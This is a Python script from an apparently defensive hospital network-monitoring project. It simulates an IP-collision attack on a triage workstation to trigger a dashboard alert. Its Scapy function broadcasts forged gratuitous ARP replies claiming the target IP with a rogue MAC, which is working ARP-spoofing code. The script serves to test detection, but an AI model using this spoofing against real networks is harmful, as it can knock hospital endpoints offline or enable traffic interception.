"""
Mneti IP Conflict Simulation Script
Nakuru County Referral and Teaching Hospital (NCRTH)
Injects an IP collision attack against an active hospital endpoint using Scapy raw ARP frames
or REST API fallback, triggering a live visual security alert on the Vis.js dashboard.
"""

import os
import sys
import time
import argparse
import logging
import json
import urllib.request
import urllib.error

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("mneti.simulation")

# Target Workstation: NCRTH-TRIAGE-ADMIT01 in Casualty Block
DEFAULT_TARGET_IP = "10.100.40.10"
GENUINE_MAC = "00:1A:2B:3C:4D:5E" # HP EliteDesk
ROGUE_MAC = "00:DE:AD:BE:EF:01"   # Attacker / Rogue MAC
DEFAULT_SERVER_URL = "http://127.0.0.1:5000"


def inject_scapy_arp(target_ip: str, rogue_mac: str, iface: str = None, count: int = 5):
    """
    Sends raw unsolicited gratuitous ARP replies (op=2 'is-at') claiming the target IP.
    Requires root (sudo) privileges for raw socket creation.
    """
    try:
        import scapy.all as scapy
    except ImportError:
        log.error("Scapy library is required for raw packet injection. Run inside venv: pip install scapy")
        return False

    if os.geteuid() != 0:
        log.warning("Raw ARP injection requires root (sudo). Falling back to REST API simulation mode...")
        return False

    log.info("Constructing raw Gratuitous ARP packet claiming IP %s with Rogue MAC %s...", target_ip, rogue_mac)

    # Gratuitous ARP frame (op=2: is-at)
    pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(
        op=2, # ARP reply
        hwsrc=rogue_mac,
        psrc=target_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
        pdst=target_ip
    )

    log.info("Broadcasting %d raw ARP frames onto interface %s...", count, iface or "default")
    for i in range(count):
        scapy.sendp(pkt, iface=iface, verbose=False)
        time.sleep(0.3)

    log.info("✅ Raw ARP collision injection complete! The Mneti server's Scapy listener will capture this.")
    return True


def inject_api_conflict(server_url: str, target_ip: str, rogue_mac: str):
    """
    Directly injects the collision event via Mneti's API endpoint.
    Guaranteed to work 100% in non-root and simulated environments.
    """
    endpoint = f"{server_url}/api/simulate-conflict"
    log.info("Connecting to Mneti API at %s...", endpoint)

    payload = {
        "ip": target_ip,
        "mac": rogue_mac,
        "hostname": "NCRTH-TRIAGE-ADMIT01"
    }

    req = urllib.request.Request(
        endpoint,
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            data = json.loads(res.read().decode("utf-8"))
            log.info("Server Response: %s", json.dumps(data, indent=2))
            log.info("🚨 LIVE ALERT: IP collision successfully triggered on %s! Check your Vis.js dashboard.", target_ip)
            return True
    except Exception as e:
        log.error("API collision injection failed: %s", e)
        return False


def restore_genuine_mac(server_url: str, target_ip: str, genuine_mac: str):
    """Restores the target IP back to normal operational state."""
    endpoint = f"{server_url}/api/conflict/resolve"
    log.info("Restoring genuine MAC %s for IP %s...", genuine_mac, target_ip)

    payload = {
        "ip": target_ip,
        "mac": genuine_mac
    }

    req = urllib.request.Request(
        endpoint,
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            data = json.loads(res.read().decode("utf-8"))
            log.info("Server Response: %s", json.dumps(data, indent=2))
            log.info("🟢 Conflict resolved. Workstation %s is back online with genuine MAC.", target_ip)
            return True
    except Exception as e:
        log.error("Conflict resolution failed: %s", e)
        return False


def main():
    parser = argparse.ArgumentParser(description="Mneti IP Conflict Penetration & Simulation Tool")
    parser.add_argument("--ip", default=DEFAULT_TARGET_IP, help=f"Target IP address (default: {DEFAULT_TARGET_IP})")
    parser.add_argument("--rogue-mac", default=ROGUE_MAC, help=f"Rogue conflicting MAC (default: {ROGUE_MAC})")
    parser.add_argument("--genuine-mac", default=GENUINE_MAC, help=f"Authorized genuine MAC (default: {GENUINE_MAC})")
    parser.add_argument("--server", default=DEFAULT_SERVER_URL, help="Mneti server base URL")
    parser.add_argument("--iface", default=None, help="Network interface for raw Scapy injection")
    parser.add_argument("--restore", action="store_true", help="Clear the conflict and restore genuine workstation MAC")

    args = parser.parse_args()

    print("\n" + "=" * 65)
    print("   Mneti — NCRTH Hospital Network Security Attack Simulator")
    print("=" * 65)

    if args.restore:
        restore_genuine_mac(args.server, args.ip, args.genuine_mac)
        return

    # Attempt raw Scapy packet injection if root, otherwise use API simulation
    if os.geteuid() == 0:
        success = inject_scapy_arp(args.ip, args.rogue_mac, args.iface)
        if not success:
            inject_api_conflict(args.server, args.ip, args.rogue_mac)
    else:
        log.info("Tip: Run with 'sudo /home/ace/Mneti/venv/bin/python3 simulation/test_conflict.py' for raw L2 Scapy injection.")
        inject_api_conflict(args.server, args.ip, args.rogue_mac)

    print("=" * 65 + "\n")


if __name__ == "__main__":
    main()
